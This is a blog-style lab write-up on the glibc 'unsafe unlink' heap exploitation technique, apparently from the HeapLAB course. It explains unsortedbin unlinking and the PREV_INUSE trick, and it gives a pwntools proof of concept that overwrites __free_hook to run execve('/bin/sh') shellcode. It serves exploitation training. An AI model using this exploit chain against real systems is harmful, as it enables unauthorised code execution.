---
layout: post
title:  "HeapLAB 1 - Unsafe Unlink"
date:   2022-12-07 20:00:01 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## General

`fastbin dup` and `tcache dup` techniques are only relevant for small chunks, that meet `size < 0x80`. \

Another bin, the `unsortedbin`, is relevant for larger allocations - and can be used for various unlink corruption techniques. 

## Exploitation

Old GLIBC versions used a simple macro, without any integrity checks, to unlink a chunk from an `unsortedbin`. \
This technique is called `unsafe unlink`. 

Chunks are considered `small` if their size is less than `0x400`. 

We're given a binary, that allows 2 `malloc` allocations. \ 
I can perform an allocation of two chunks of size `0x88` (so they will be within the `unsortedbin` size), and free the first allocated chunk. \
Recall that freeing the second-allocated chunk would lead to coalescing with the `top_chunk`. 

A trick to view the main heap layout:

```bash
pwndbg> dq mp_.sbrk_base
```

A cool technique is overwriting the `PREV_INUSE` flag of certain chunk, hence treating the previous allocated chunk as a free, which makes it a consolidation candidate. 

Recall that upon consolidation, Malloc first *unlinks the candidate chunk from its bin*, even if the coalescing can be made without any unlinking (not trivial). \
This is because of the de-allocation policy - the newly freed chunk must be added towards the head of the bin. \
Therefore, the candidate is the one being added to the newly freed chunk, creating a large free chunk that is stored within the bin's head.


It basically means the following for chunk `A`:

```c
(A->bk)->fd = A->fd; 
(A->fd)->bk = A->bk;
```

Meaning:

```c
*((A->bk) + 0x10) = A->fd;
*((A->fd) + 0x18) = A->bk;
```

We can also write these rules in a more explicit form, however it might be confusing:

```c
*(*(A + 0x18) + 0x10) = *(A + 0x10)
*(*(A + 0x10) + 0x18) = *(A + 0x18)
```

In case I'd pick the following:

```c
(A->fd) + 0x18 = __free_hook_libc_addr; // A->fd = __free_hook_libc_addr - 0x18
(A->bk) = shellcode_heap_addr; 
```

It implies that `shellcode_heap_addr + 0x10` must be a writeable memory. This may limit our shellcode size to 16 bytes.

The other choice:

```c
(A->bk) + 0x10 = __free_hook_libc_addr; // A->bk = __free_hook_libc_addr - 0x10
(A->fd) = shellcode_heap_addr
```

It implies that `shellcode_heap_addr + 0x18` must be a writeable memory. This is much better, and gives us 8 crucial bytes. 

Note - the shellcode size limitation can be easily bypassed, by adding a `jmp <OFFSET_OF_AT_LEAST 16+8 BYTES>` at the start of the shellcode.

Full POC:

```python
# Prepare execve("/bin/sh") shellcode with a jmp over where the fd will be written.
shellcode = asm("jmp shellcode;" + "nop;"*0x30 + "shellcode:" + shellcraft.execve("/bin/sh"))

chunk_a = malloc(0x88)
chunk_b = malloc(0x88)

fd = p64(heap + 0x20)
bk = p64(libc.sym.__free_hook - 0x10)
prev_size = p64(0x90)
fake_size = p64(0x90)  # clears the PREV_INUSE bit
edit(chunk_a, fd + bk + shellcode + b"A"*(0x70-len(shellcode))+ prev_size + fake_size)

# Overwrite __free_hook via unsafe unlink
free(chunk_b)

# Trigger __free_hook
free(chunk_a)
```

This exploit uses the `backward consolidation` - as the fake `fd, bk` held within the chunk preceding the chunk being freed. \
There is also a `forward consolidation` variant, where the fake `fd, bk` reside within the succeeding chunk. 

Note that in this case, `prev_size` was overwritten to the original value, of `0x90`. \
However, it can be overwritten to other values, hence pointing towards other location fake chunk. \
In particular - it can be set to `0x0`, making the current chunk to be consolidated by itself! 
